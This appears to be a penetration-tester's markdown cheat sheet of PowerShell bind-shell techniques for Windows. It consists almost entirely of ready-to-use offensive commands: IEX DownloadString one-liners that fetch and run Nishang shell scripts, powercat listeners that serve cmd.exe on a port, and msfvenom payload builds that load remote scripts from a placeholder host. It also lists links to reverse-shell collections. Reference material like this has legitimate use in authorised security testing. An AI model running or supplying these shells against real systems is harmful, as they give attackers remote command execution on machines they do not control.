# PowerShell

## 01 - Nishang

### 1.1 - TCP Method

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1')

Invoke-PowerShellTcp -Bind -Port <PORT>
```

### 1.2 - UDP Method

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1')

Invoke-PowerShellUdp -Bind -Port <PORT>
```

## 02 - Generate via `powercat`

Generate bind shell.

```
> powercat -l -p <PORT> -e cmd.exe -g
```

Generate encoded bind shell.

```
> powercat -l -p <PORT> -e cmd.exe -ge
```

## 03 - Generate via `msfvenom`

### 3.1 - x86 (32-bit) Payloads

You can load powershell scripts ahead of time.

```
$ msfvenom -p cmd/windows/powershell_bind_tcp lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell.ps1

$ msfvenom -p windows/powershell_bind_tcp lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell.ps1
```

### 3.2 - x86-64 (64-bit) Payloads

You can load powershell scripts ahead of time.

```
$ msfvenom -p windows/x64/powershell_bind_tcp lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell-x86-64.ps1
```

---
## References

### Github

- [MrPineMan: Awesome Reverse Shell](https://github.com/MrPineMan/Awesome-Reverse-Shell)

- [Powercat](https://github.com/besimorhino/powercat)

### Hacktricks

- [Hacktricks: Shell Windows](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/windows.html)

### Ironhackers

- [Ironhackers: Commands in Windows to Get Shell](https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/)